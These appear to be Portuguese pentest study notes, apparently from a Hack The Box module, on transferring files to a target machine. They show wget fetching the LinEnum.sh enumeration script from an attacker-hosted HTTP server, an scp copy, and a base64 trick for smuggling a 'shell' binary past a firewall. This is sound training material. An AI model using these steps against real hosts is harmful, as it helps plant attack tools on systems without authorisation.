# Transferindo-Arquivos

MAQUINA HOST
-
Gust4vo@htb[/htb]$ cd /tmp </br>
Gust4vo@htb[/htb]$ chmod +x LinEnum.sh </br>
Gust4vo@htb[/htb]$ python3 -m http.server 8000

 MAQUINA ALVO USANDO WGET COM
 -
user@remotehost$ wget http://10.10.14.1:8000/LinEnum.sh </br>
...SNIP... </br>
Saving to: 'linenum.sh' </br>
linenum.sh 100%[==============================================>] 144.86K  --.-KB/s    in 0.02s </br>
2021-02-08 18:09:19 (8.16 MB/s) - 'linenum.sh' saved [14337/14337] </br>

MAQUINA ALVO USANDO SCP
 -
 Gust4vo@htb[/htb]$ scp linenum.sh user@remotehost:/tmp/linenum.sh </br>
 user@remotehost's password: ********* </br>
 linenum.sh </br>

 ---

 Em alguns casos, talvez não consigamos transferir o arquivo. Por exemplo, o host remoto pode ter proteções de firewall que nos impedem de baixar um arquivo de nossa máquina. Neste tipo de situação, podemos usar um truque simples para base64 codificar o ficheiro </br>

 MAQUINA HOST
-
Gust4vo@htb[/htb]$ base64 shell -w 0 </br>
f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU </br>

MAQUINA ALVO USANDO BASE64
 -
user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell

